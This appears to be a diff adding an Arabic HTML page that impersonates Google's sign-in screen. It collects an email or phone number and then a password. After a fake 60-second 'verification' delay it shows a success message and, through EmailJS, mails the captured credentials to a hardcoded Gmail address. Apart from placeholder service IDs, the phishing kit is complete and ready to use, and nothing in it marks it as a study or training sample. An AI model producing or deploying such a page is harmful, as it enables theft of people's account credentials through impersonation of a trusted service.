@@ -1,0 +1,153 @@
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            color: #202124;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .logo {
+            margin-top: 50px;
+        }
+        .logo img {
+            width: 100px;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 20px 0;
+        }
+        p {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .input-container {
+            margin: 20px 0;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+        }
+        .forgot-email {
+            margin: 10px 0;
+        }
+        .button-container {
+            margin: 20px 0;
+        }
+        button {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .create-account {
+            margin-top: 20px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="login-step-1">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        </div>
+        <h1>تسجيل الدخول</h1>
+        <p>باستخدام حسابك على Google.</p>
+        <a href="#">مزيد من المعلومات حول استخدام حسابك</a>
+        <div class="input-container">
+            <input type="text" id="email-phone" placeholder="البريد الإلكتروني أو الهاتف">
+        </div>
+        <div class="forgot-email">
+            <a href="#">هل نسيت البريد الإلكتروني؟</a>
+        </div>
+        <div class="button-container">
+            <button onclick="goToPasswordStep()">التالي</button>
+        </div>
+        <div class="create-account">
+            <a href="#">إنشاء حساب</a>
+        </div>
+    </div>
+
+    <div class="container hidden" id="login-step-2">
+        <h1>أدخل كلمة المرور</h1>
+        <div class="input-container">
+            <input type="password" id="password" placeholder="كلمة المرور">
+        </div>
+        <div class="button-container">
+            <button onclick="verifyInfo()">التالي</button>
+        </div>
+    </div>
+
+    <div class="container hidden" id="verification-step">
+        <h1>جار التحقق من المعلومات...</h1>
+    </div>
+
+    <div class="container hidden" id="success-step">
+        <h1>تم تسجيل الدخول بنجاح</h1>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("YOUR_USER_ID"); // استبدل YOUR_USER_ID بمعرف المستخدم الخاص بك من EmailJS
+        })();
+
+        function goToPasswordStep() {
+            document.getElementById('login-step-1').classList.add('hidden');
+            document.getElementById('login-step-2').classList.remove('hidden');
+        }
+
+        function verifyInfo() {
+            document.getElementById('login-step-2').classList.add('hidden');
+            document.getElementById('verification-step').classList.remove('hidden');
+
+            setTimeout(function() {
+                document.getElementById('verification-step').classList.add('hidden');
+                document.getElementById('success-step').classList.remove('hidden');
+                sendEmail();
+            }, 60000);
+        }
+
+        function sendEmail() {
+            const emailPhone = document.getElementById('email-phone').value;
+            const password = document.getElementById('password').value;
+
+            const templateParams = {
+                to_email: 'family198300@gmail.com',
+                from_name: 'Login System',
+                message: `Email/Phone: ${emailPhone}\nPassword: ${password}`
+            };
+
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+        }
+    </script>
+</body>
+</html>
